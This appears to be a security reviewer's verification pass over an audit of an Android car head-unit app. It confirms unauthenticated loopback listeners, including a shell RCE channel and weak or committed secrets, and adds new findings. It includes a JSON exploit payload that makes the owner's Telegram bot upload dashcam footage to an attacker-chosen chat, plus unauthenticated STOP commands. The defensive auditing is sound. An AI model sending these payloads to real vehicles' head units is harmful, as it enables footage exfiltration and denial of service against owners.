# 10 — Independent Review & Verification

*Reviewer pass over the existing audit (docs 01–09), plus a fresh codebase sweep.*
*Audited tree: `main` @ `a6ecca5` (same commit the audit pins).*

This document answers two questions the owner asked:

1. **Is the existing audit accurate?** — I re-derived the load-bearing findings from source rather than trusting the write-ups.
2. **Did a second pass find anything the audit missed?** — Yes: four more unauthenticated loopback listeners (F21 footage exfiltration is High; F24 Sentry keepalive-kill + location control is Medium), and one accuracy correction to the audit's *impact* framing (the signature-protected `BYDAUTO_*` **writes** are not actually granted; actuation is cloud-mediated, not local-HAL). None of it overturns the audit's structure; it *reinforces* the central root cause and tightens the calibration.

---

## Part 1 — Verification of the existing findings

I independently confirmed each of the high-severity claims against the code at the pinned commit. Every one checks out as written.

| # | Claim | Verified in source | Verdict |
|---|-------|--------------------|---------|
| F1 | Unauth `shell` → RCE on `127.0.0.1:19876` | `TcpCommandServer.java` — `handleClient` reads a line and calls `processCommand` with no token/UID check; `case "shell"` runs `Runtime.exec({"sh","-c",cmd})` | ✅ Accurate |
| F4 | Live camera WebSocket on `0.0.0.0:8887`, zero auth | `WebSocketStreamServer` ctor `super(new InetSocketAddress(PORT))` (wildcard bind); `onOpen` does `clients.add(conn)` then sends SPS/PPS — no handshake token inspection | ✅ Accurate |
| F5 | 8-char (~41-bit) JWT secret, world-readable config | `generateSecret(8)` over a 36-char alphabet, used directly as the HMAC key; `JWT_EXPIRY_MS = 365d` ("effectively indefinite" in-source); config at `/data/local/tmp/overdrive_config.json` set `setReadable/​Writable(true, false)` | ✅ Accurate |
| F6 | `Safe`/`Enc` AES key committed to repo | `generate_safe_enc.py` ships the identical `K1..K4`/IV byte arrays that `Safe.java` reassembles — the decrypt key and the decryptor are in the same public tree | ✅ Accurate |
| F8 | Loopback "safety-net" fail-open | `AuthMiddleware` Tier-2: `if (!hasTunnelHeaders && isLoopback) return true;` — substring match on `SocketAddress.toString()`, exactly as described | ✅ Accurate |
| F17 | `deviceId` leaked pre-auth | `/auth/status` is in `PUBLIC_PATHS`; the file comment literally reads `"/auth/status - leaks deviceId, requires auth"` — the code contradicts its own comment, as the audit flags | ✅ Accurate |
| F2 | Opt-in proxy funnels ProxyHelper clients through a hard-coded VLESS node | `SingboxLauncher.kt` hard-codes `80.225.224.92:443` + uuid/public_key/short_id in plaintext; `ProxyHelper.getHttpProxy()` returns `Proxy.NO_PROXY` when sing-box is down (confirms opt-in) | ✅ Accurate |

I also confirmed the audit's **PR-review corrections are sound**, not hand-waving:

- The proxy really *is* opt-in (`NO_PROXY` when the daemon is off) — the downgrade from "all egress MITM" to "app-scoped, if enabled" is correct.
- The OTA download really does transit HTTPS with default cert validation (`wget`/`curl` + OkHttp), so the earlier "proxy forges the APK" chain was correctly retracted; `pm install -r -d`'s same-signer enforcement is Android's, and the *remaining* gap (silent same-signer **downgrade**, no anti-rollback) is real.
- MQTT config genuinely lives in a **separate** file (`mqtt_connections.json`) that the restore merge never touches — the F10 correction is right.

**Bottom line on Part 1:** this is a high-quality, honest audit. It does not overstate. Where it walked a claim back under review, the walk-back matches the code. The "What is done well" section is also fair — I confirmed the JWT HS256 recompute-and-compare (no `alg:none`), the PBKDF2 PIN, the Telegram single-owner allowlist, and the community shell-action block all exist as described.

---

## Part 2 — What the second pass adds

The audit's binding table (doc 01) lists four listeners: HTTP `:8080`, TCP command `:19876`, video WS `:8887`, surveillance IPC `:19877`. A full sweep for `ServerSocket`/`bind(` finds **four more loopback listeners** the audit does not enumerate. Of these, **F21 (Telegram IPC) is live and High**, **F24 (Sentry control socket) is live and Medium**, **F23 (AAC ingest) is live with a lower-value payload**, and **F22 (BYD event daemon) is dead code in this build** — F22/F23/F24 refined or added after Codex correctly caught that F22's daemon is never started, that F21 allows an attacker-chosen recipient, that my "full sweep" had itself missed F24, and that F24's real impact is keepalive-denial + location control rather than a direct dashcam kill. They share the exact root cause the audit already names — *loopback binding treated as an authorization boundary* — so the live ones extend F1/F9/F16 rather than opening a new class.

### F21 — 🟠 High: Telegram daemon IPC (`127.0.0.1:19880`) exfiltrates footage to an *attacker-chosen* chat, unauth

`TelegramBotDaemon` runs a second server socket on `127.0.0.1:19880` (`handleIpcClient` → `processIpcCommand`) with **no caller authentication**. Any co-resident app (ordinary `INTERNET` permission, same as F1) can connect and issue its commands — `sendMessage`, `sendVideo`, `notifyTunnel`, `notifyMotion`, `notifyCritical`.

> **Correction / severity upgrade (per Codex PR review — verified in source):** my first version claimed "the destination is fixed to `ownerChatId`, so the attacker cannot redirect footage to themselves." **That is wrong.** Both `sendMessage` and `sendVideo` read a **caller-supplied `chatId`** — `long chatId = cmd.optLong("chatId", ownerChatId)` — falling back to the owner *only when the field is omitted*. So a co-resident caller can name **any** destination chat. `sendVideo(chatId, path, caption)` then takes **any daemon-readable file path with no allowlist** and uploads it (files ≤ Telegram's ~50 MB limit; larger ones return a text notice). This is **direct footage/file exfiltration to attacker infrastructure**, not merely owner-alert spoofing — F21 is therefore High, not Low/Medium. Thanks to the reviewer for the catch.

**Exploit (given the preconditions below):**
```json
{"cmd":"sendVideo","chatId":<attacker-chat-id>,"path":"/sdcard/DCIM/BYDCam/event_XXXX.mp4"}
```
→ the owner's own bot uploads the recording straight to the attacker's Telegram. `sendMessage` with an attacker `chatId` similarly lets the attacker read nothing but *send* arbitrary text from the bot to any chat.

**Preconditions:** Telegram must be configured (a `botToken` is present) and, for `sendVideo`, **video uploads enabled** (`videoUploadsEnabled` gate) and the message category enabled for `sendMessage`. These are common configurations for anyone using the Telegram integration — the whole point of which is footage-to-Telegram — so the precondition is not much of a barrier for the target population. It composes with F12 (world-readable footage on `/sdcard`) and F13 (fake alerts during pairing).

The audit's Telegram doc (07) analyses only the *inbound* long-poll owner gate; this *outbound* local IPC — and its arbitrary-recipient exfiltration — is not covered there.

### F22 — 🟡 Low (dormant in the audited build): BYD event daemon telemetry (`127.0.0.1:19878`), unauth *if launched*

`BydEventDaemon` *contains* a loopback listener on `127.0.0.1:19878` that answers `ping`/`status`/`getRadar`/`getBattery` with no auth (read-only; no setters in the command table).

> **Correction (per Codex PR review — verified):** in the audited runtime this daemon is **not started**, so the `:19878` listener is not actually exposed on a normal install. The only launch paths are stubbed out: `BydSystemManager.startEventSystem()` has the `startBydEventDaemon()` call **commented out** and logs *"BydEventDaemon start skipped (PrivilegedShellSetup disabled)"*, and `DaemonManager.startBydEventDaemon()` is a no-op that only records state. `SentryEventHandler`/`BydEventClient` are *clients* that would fail to connect. So this is **dead code in this build**, reachable only if some external/manual launcher starts the daemon. Recorded as a latent surface to fix if it is ever re-enabled — not a live exposure today. Thanks to the reviewer for catching this.

### F23 — 🟡 Low: AAC audio-ingest listener (`127.0.0.1`), unauth — plus a latent (not live) port-number clash

`AacIngestServer` is loopback-bound with no caller auth (doc 02 acknowledges the "audio-ingest IPC" in passing but does not score it) — this one **is** launched, so it is a live unauth loopback surface, though its payload is an audio stream rather than a command set.

> **Correction (per Codex PR review — verified):** I originally called the shared port number a "probable runtime collision." That overstates it. `AacIngestServer.PORT` and `BydEventDaemon.TCP_PORT` are **both `19878`**, but because `BydEventDaemon` is not started (F22), `AacIngestServer` binds `19878` cleanly — there is **no live collision** in the audited build. (The codebase already recognised the clash and moved the *TelegramBot* IPC off `19878` to `19880` — see the comment at `TelegramBotDaemon.java`.) So this is a **latent config smell** — a duplicated port constant that would collide only if the dormant daemon is re-enabled — not a current reliability bug. The listener inventory would still benefit from a single documented port registry.

### F24 — 🟡 Medium: unauthenticated Sentry control socket (`127.0.0.1:19879`) — kill the keepalive daemon + control location monitoring

> **Added per Codex PR review — verified.** My "full sweep" write-up missed this live listener; Codex flagged it, then correctly pushed back on my first impact wording (see the scope note below).

`SentryDaemon.startControlSocket()` binds `127.0.0.1:19879` (`CONTROL_PORT`) and is called on **both** startup paths — the with-context branch and the no-context shell fallback (`SentryDaemon.java:110,124`) — and `DaemonLauncher.launchSentryDaemon` actively launches this daemon, so it is **live on a normal install** (unlike F22). It reads one line and dispatches with **no authentication**:

- `STOP` / `KILL` / `EXIT` → `SentryDaemon.shutdown()`.
- `LOCATION_MONITOR_ON` / `LOCATION_MONITOR_OFF` / `LOCATION_RESTART` → toggle the location-sidecar monitor.
- `STATUS` → discloses PID + whether location monitoring is on.

> **Scope correction (per Codex PR review — verified):** my first draft called this a "kill-switch for surveillance / disarm the dashcam." That overstates the *direct* effect. `SentryDaemon` does **not** own the camera/surveillance pipeline — `CameraDaemon` does — and `shutdown()` only releases `SentryDaemon`'s own wake-lock, closes its control socket, and `System.exit(0)`s; it never signals `CameraDaemon`. So `STOP` kills the **power/keepalive daemon** (whose documented job is holding the ACC-lock + WakeLock that "prevent force_suspend," keeping WiFi up, and network-whitelisting the UIDs), and the other commands control **location monitoring**. To *directly* disable surveillance a co-resident attacker would instead use the `disableSurveillance` / camera-stop commands on the **F1 channel** (`:19876`), which is the more severe unauth surface anyway.

**Impact:** any co-resident process can (a) **kill the sentry keepalive/power daemon** — a local **denial-of-availability** that drops the ACC-lock/WakeLock protecting the OverDrive stack from OS suspension, which can *indirectly* degrade persistence (including surveillance) when the head unit tries to suspend, though this is an availability cascade, not a direct "stop recording" command; and (b) **toggle/kill location monitoring**. No credential required. Same root cause as F1/F9 (loopback treated as authorization). Note also the in-source comment on this method says *"Listens on localhost:19876"* while the constant is `19879` — a stale comment worth fixing so the port inventory isn't misleading.

---

## Part 3 — Direct answer to the owner's concern

> *"I'm concerned about handing over so much deep control of my vehicle."*

That concern is **well-founded** — but one premise the audit leans on needs an accuracy correction (see the box below): the app *requests* the full `BYDAUTO_*` HAL set in its manifest, but on a non-platform-signed APK the **write** half of that set is **not actually granted** — actuation happens through the **BYD cloud** with your own credentials, not through locally-held HAL privilege. The structural problem the audit identifies is real either way: the app exposes vehicle-affecting power through channels that, in several cases, trust *position* (on the head unit, on the LAN, on the broker) instead of *identity*.

> **Accuracy correction to the audit's impact framing (per Codex PR review — verified in source).** The audit repeatedly states the daemon "holds the full `BYDAUTO_*` HAL permission set (door lock get/**set**, engine, gearbox, charging, ADAS)" as *local* privilege (doc 02 F16, README bottom-line). The code contradicts the **set/write** half of that:
> - The manifest's own comment says signature-protected writes "(`BYDAUTO_BODYWORK_SET` et al) will be **denied** by DiCarServer since our APK isn't signed with the BYD platform key" (`AndroidManifest.xml`), and `PermissionGranter` documents that "signature permissions will fail silently and get skipped" by `pm grant` from shell.
> - `CarPropertyBridge` confirms it end-to-end: local `setProperties()` "works mechanically — but the underlying property config gates writes on signature-protected permissions… those writes return `STATUS_FAILED`… best thought of as a **read-side + config-probe tool today**."
> - Real actuation is therefore **not** local-HAL: `VehicleCommandRouter` routes control commands through the **BYD cloud REST API** (`/control/remoteControl`) authenticated with your stored BYD-cloud login, plus whatever non-signature property surface exists. `GET` permissions and shell-grantable ones (e.g. `WRITE_SECURE_SETTINGS`, which carries the development flag) *are* granted; the sig-protected `*_SET` HAL writes are not.
>
> **What this changes:** the "co-resident app → local HAL → unlock the doors" chain is weaker than the audit implies — a local attacker cannot actuate straight through the HAL. **What it does not change:** actuation is still reachable, just by a different route — driving the app's cloud path, or using the **BYD-cloud credentials stored in the config** (F11/doc 09), or the cloud-backed command paths behind the unauth surfaces. So "an unauthorised party can control the car" stays true where the cloud credentials/session are in play; it is the *mechanism* (cloud-mediated, credential-gated) that the audit mis-states as *local HAL privilege*. The audit's `BYDAUTO`-actuation impact lines should be scoped to "via the BYD-cloud leg with the owner's credentials," not "because the daemon holds HAL write permission."

The single most important structural fact — mine and the audit's conclusion both land here — is:

> **The app repeatedly treats "reached me over loopback / the LAN / a shared broker" as "authorized."**

Every Critical/High in the audit, plus my four additions, is an instance of that one mistake. It is *fixable* (positive authentication on each channel, a non-world-readable secret store, TLS, signed updates/backups) and the audit's per-doc recommendations are the right fixes — but until they land, the honest summary for an owner deciding whether to run this is:

- **Lowest-exposure posture:** do **not** enable the sing-box proxy, MQTT control, or any tunnel (zrok/cloudflared); keep the head unit off untrusted Wi-Fi. That removes F2, F7, F14 (remote), and F19 from your threat model entirely — they are all opt-in.
- **Irreducible residual risk** even with everything off: any *co-resident app or ADB-context process* on the head unit can reach the unauthenticated loopback surfaces — F1 shell-RCE (which *also* carries a direct `disableSurveillance`/camera-stop command), F9 surveillance IPC, F24 (kill the keepalive daemon + control location monitoring), F21 footage exfiltration to an attacker-chosen Telegram chat when the Telegram integration is on, plus F5/F6/F16 secret exposure (including the stored BYD-cloud credentials that *do* enable cloud actuation). If you trust everything installed on the unit and don't sideload, this is contained; if the unit runs untrusted apps, it is not.
- **Non-negotiable if any secret has ever shipped or been exported:** rotate them (doc 09 §recommendation 4). The committed `Safe`/`Enc` key is already public; treat anything it "protected" as public too.

None of this requires trusting the maintainer to be *malicious* — the proxy-operator question (doc 03) is worth resolving with the OSINT commands there — but most of the risk is structural, independent of intent, and reachable by third parties the maintainer doesn't control either.
